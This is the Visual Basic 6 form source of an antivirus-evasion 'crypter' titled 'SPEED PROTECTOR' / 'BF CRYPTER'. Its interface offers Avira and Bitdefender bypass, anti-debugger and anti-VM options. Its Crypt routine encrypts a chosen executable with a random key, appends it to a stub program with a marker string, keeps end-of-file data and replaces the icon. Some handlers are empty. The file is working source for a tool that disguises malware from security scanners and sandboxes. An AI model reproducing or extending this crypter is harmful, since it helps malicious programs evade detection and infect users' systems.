VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "comdlg32.ocx"
Begin VB.Form Form1 
   BackColor       =   &H80000009&
   BorderStyle     =   4  'Fixed ToolWindow
   Caption         =   "                                     SPEED PROTECTOR  0.1  -   PUBLIC VERSION"
   ClientHeight    =   6330
   ClientLeft      =   45
   ClientTop       =   240
   ClientWidth     =   7455
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   Picture         =   "Form1.frx":57E2
   ScaleHeight     =   6330
   ScaleWidth      =   7455
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin VB.CommandButton Command8 
      Caption         =   "Check for Updates"
      Height          =   375
      Left            =   5760
      TabIndex        =   24
      Top             =   5760
      Width           =   1455
   End
   Begin VB.CommandButton Command6 
      Caption         =   "About"
      Height          =   375
      Left            =   3960
      TabIndex        =   23
      Top             =   5760
      Width           =   1455
   End
   Begin VB.CheckBox Check11 
      BackColor       =   &H80000009&
      Caption         =   "Anti-VMWare"
      Height          =   255
      Left            =   5280
      TabIndex        =   22
      Top             =   4560
      Width           =   1455
   End
   Begin VB.CheckBox Check10 
      BackColor       =   &H80000009&
      Caption         =   "Anti Olly Debugger"
      Height          =   255
      Left            =   5280
      TabIndex        =   21
      Top             =   4800
      Width           =   1935
   End
   Begin VB.CheckBox Check9 
      BackColor       =   &H80000009&
      Caption         =   "Anti Virtual Box"
      Height          =   195
      Left            =   2760
      TabIndex        =   20
      Top             =   5280
      Width           =   1695
   End
   Begin VB.CheckBox Check8 
      BackColor       =   &H80000009&
      Caption         =   "Anti Anubis"
      Height          =   255
      Left            =   2760
      TabIndex        =   19
      Top             =   5040
      Width           =   1455
   End
   Begin VB.CheckBox Check7 
      BackColor       =   &H80000009&
      Caption         =   "OEP"
      Height          =   195
      Left            =   2760
      TabIndex        =   18
      Top             =   4560
      Width           =   1335
   End
   Begin VB.CheckBox Check1 
      BackColor       =   &H80000009&
      Caption         =   "Anti Debugger"
      Height          =   255
      Left            =   2760
      TabIndex        =   17
      Top             =   4800
      Width           =   1575
   End
   Begin VB.TextBox Text5 
      Height          =   375
      Left            =   4080
      TabIndex        =   16
      Text            =   "Text5"
      Top             =   9240
      Width           =   1455
   End
   Begin VB.CheckBox Check6 
      BackColor       =   &H80000009&
      Caption         =   "Bitdefender Bypass"
      Height          =   255
      Left            =   5280
      TabIndex        =   15
      Top             =   5280
      Width           =   1935
   End
   Begin VB.CheckBox Check5 
      BackColor       =   &H80000009&
      Caption         =   "Avira Bypass"
      Height          =   255
      Left            =   5280
      TabIndex        =   14
      Top             =   5040
      Width           =   1695
   End
   Begin VB.CheckBox Check4 
      BackColor       =   &H80000009&
      Caption         =   "PE Entry Point"
      Height          =   255
      Left            =   240
      TabIndex        =   13
      Top             =   5280
      Width           =   2655
   End
   Begin VB.CheckBox Check3 
      BackColor       =   &H80000009&
      Caption         =   "Realign PE"
      Height          =   255
      Left            =   240
      TabIndex        =   12
      Top             =   5040
      Width           =   2415
   End
   Begin VB.CheckBox Check2 
      BackColor       =   &H80000009&
      Caption         =   "Enabled Custom Stub"
      Height          =   255
      Left            =   240
      TabIndex        =   11
      Top             =   4800
      Width           =   2055
   End
   Begin VB.CheckBox chkEOF 
      BackColor       =   &H80000009&
      Caption         =   "Read EOF Data"
      ForeColor       =   &H00000000&
      Height          =   255
      Left            =   240
      Picture         =   "Form1.frx":B776
      TabIndex        =   10
      Top             =   4560
      UseMaskColor    =   -1  'True
      Width           =   1575
   End
   Begin VB.CommandButton Command2 
      Caption         =   "..."
      Height          =   255
      Left            =   5400
      TabIndex        =   9
      Top             =   4080
      Width           =   1815
   End
   Begin VB.TextBox Text2 
      Height          =   285
      Left            =   240
      TabIndex        =   8
      Text            =   "Select personalized stub..."
      Top             =   4080
      Width           =   4815
   End
   Begin VB.CommandButton Command3 
      Caption         =   "Generate"
      Height          =   255
      Left            =   5400
      TabIndex        =   7
      Top             =   3600
      Width           =   1815
   End
   Begin VB.TextBox Text3 
      Height          =   285
      Left            =   240
      TabIndex        =   6
      Text            =   "Text3"
      Top             =   3600
      Width           =   4815
   End
   Begin VB.CommandButton Command7 
      Caption         =   "..."
      Height          =   255
      Left            =   5400
      TabIndex        =   5
      Top             =   3120
      Width           =   1815
   End
   Begin VB.TextBox Text4 
      Height          =   285
      Left            =   240
      TabIndex        =   4
      Text            =   "Select icon..."
      Top             =   3120
      Width           =   4815
   End
   Begin VB.CommandButton Command1 
      Caption         =   "..."
      Height          =   255
      Left            =   5400
      TabIndex        =   3
      Top             =   2640
      Width           =   1815
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Left            =   240
      TabIndex        =   2
      Text            =   "File to crypt..."
      Top             =   2640
      Width           =   4815
   End
   Begin VB.CommandButton Command5 
      Caption         =   "Private Version"
      Height          =   375
      Left            =   2160
      TabIndex        =   1
      Top             =   5760
      Width           =   1455
   End
   Begin VB.CommandButton Command4 
      Caption         =   "Crypt"
      Height          =   375
      Left            =   360
      TabIndex        =   0
      Top             =   5760
      Width           =   1455
   End
   Begin MSComDlg.CommonDialog g 
      Left            =   6000
      Top             =   6360
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin MSComDlg.CommonDialog d 
      Left            =   8640
      Top             =   480
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin MSComDlg.CommonDialog C 
      Left            =   6360
      Top             =   6240
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.Image Image1 
      Height          =   2415
      Left            =   0
      Picture         =   "Form1.frx":150EC
      Top             =   0
      Width           =   7590
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Const ou = "rt7y3468·%/)=·%I·%245856kruyr4214657465639854ªaa"
Public Function ReadEOFData(sFilePath As String) As String
On Error GoTo err:
Dim sFileBuf As String, sEOFBuf As String, sChar As String
Dim lFF As Long, lPos As Long, lPos2 As Long, lCount As Long
If Dir(sFilePath) = "" Then GoTo err:
lFF = FreeFile
Open sFilePath For Binary As #lFF
sFileBuf = Space(LOF(lFF))
Get #lFF, , sFileBuf
Close #lFF
lPos = InStr(1, StrReverse(sFileBuf), GetNullBytes(30))
sEOFBuf = (Mid(StrReverse(sFileBuf), 1, lPos - 1))
ReadEOFData = StrReverse(sEOFBuf)
If ReadEOFData = "" Then
'MsgBox "EOF data was not detected!", vbInformation
End If
Exit Function
err:
ReadEOFData = vbNullString
End Function
Sub WriteEOFData(sFilePath As String, sEOFData As String)
Dim sFileBuf As String
Dim lFF As Long
On Error Resume Next
If Dir(sFilePath) = "" Then Exit Sub
lFF = FreeFile
Open sFilePath For Binary As #lFF
sFileBuf = Space(LOF(lFF))
Get #lFF, , sFileBuf
Close #lFF
Kill sFilePath
lFF = FreeFile
Open sFilePath For Binary As #lFF
Put #lFF, , sFileBuf & sEOFData
Close #lFF
End Sub

Private Sub Check2_Click()
Text2.Enabled = True
End Sub

Private Sub Check7_Click()
Text5.Enabled = True
End Sub

Private Sub chkEOF_Click()
chkEOF.Enabled = True
End Sub

Private Sub Command1_Click()
With C
.Filter = "All files *.*"
.DialogTitle = "Choose file to crypt..."
.ShowOpen
End With
Text1.Text = C.FileName
End Sub

Private Sub Command16_Click()

End Sub

Private Sub Command2_Click()
With d
.Filter = "Executable Files (*.exe) | *.exe"
.DialogTitle = "Choose Stub ..."
.InitDir = App.Path
.ShowOpen
End With
Text1.Text = d.FileTitle
End Sub

Private Sub Command3_Click()
Text3.Text = ""
Dim e As Long
For e = 1 To 12
Text3.Text = Text3.Text & r
Text3.Text = Text3.Text & letra()
Text3.Text = Text3.Text & signo()
Next e
End Sub

Private Sub Command4_Click()
Dim TheEOF As String
Dim err As String

If chkEOF.Value = Checked Then
TheEOF = ReadEOFData(Text1.Text)
Else
End If
If C.FileName = "" Then
MsgBox "Choose file to crypt", vbExclamation, "BF CRYPTER"
Exit Sub
End If
With g
.Filter = "Executable Files  (*.exe) | *.exe"
.DialogTitle = "Choose where save the crypted file"
.InitDir = App.Path
.ShowSave
End With
If g.FileName = "" Then
MsgBox "Choose where save the crypted file", vbExclamation, "BF CRYPTER"
Exit Sub
End If
Open C.FileName For Binary As #1
Dim f As String
f = Space(LOF(1) - 1)
Get #1, , f
Close #1

Open App.Path & "/Stub.exe" For Binary As #1
Dim t As String
t = Space(LOF(1) - 1)
Get #1, , t
Close #1
Dim h As New Class1
Open g.FileName For Binary As #1
Put #1, , t & ou
Put #1, , h.EncryptString(f, Text3.Text) & ou
Put #1, , Text3.Text & ou
Close #1
If chkEOF.Value = Checked Then
Call WriteEOFData(g.FileName, TheEOF)
End If
ReplaceIcons Text4.Text, g.FileName, err

MsgBox "Crypted", vbInformation, "BF CRYPTER"
End Sub

Private Function r() As Integer
Randomize
var1 = Int(12 * Rnd)
r = var1
End Function

Private Function letra() As String
s:
keyset = "ABCDEFGHIJKLMNÑOPQRSTUVWXYZ"
Randomize
var1 = Int(27 * Rnd)
If var1 = 0 Then GoTo s
k = Mid(keyset, var1, 1)
letra = k
End Function

Private Function signo() As String
sa:
keyset = "!·$%&/()=?¿|\#~~~€¬]=ºª[{}_:;"
Randomize
var1 = Int(12 * Rnd)
If var1 = 0 Then GoTo sa
k = Mid(keyset, var1, 1)
signo = k
End Function


Private Sub Command5_Click()
Form3.Show
End Sub

Private Sub Command6_Click()
Form2.Show
End Sub

Private Sub Command7_Click()
g.DialogTitle = "Choose new icon..."
g.InitDir = App.Path
g.Filter = "Icon Files (*.ico) | *.ico"
g.ShowOpen
Text4.Text = g.FileName
End Sub

Private Sub Command8_Click()

End Sub

Private Sub Form_Load()
BorderStyle = Black
Text5.Enabled = False
Text2.Enabled = False
Text3.Text = ""
Dim e As Long
For e = 1 To 12
Text3.Text = Text3.Text & r
Text3.Text = Text3.Text & letra()
Text3.Text = Text3.Text & signo()
Next e
End Sub
Public Function GetNullBytes(lNum) As String
Dim sBuf As String
Dim i As Integer
For i = 1 To lNum
sBuf = sBuf & Chr(0)
Next
GetNullBytes = sBuf
End Function


Private Sub VScroll1_Change()

End Sub

Private Sub SSTab1_DblClick()
Picture.Enabled = False
End Sub


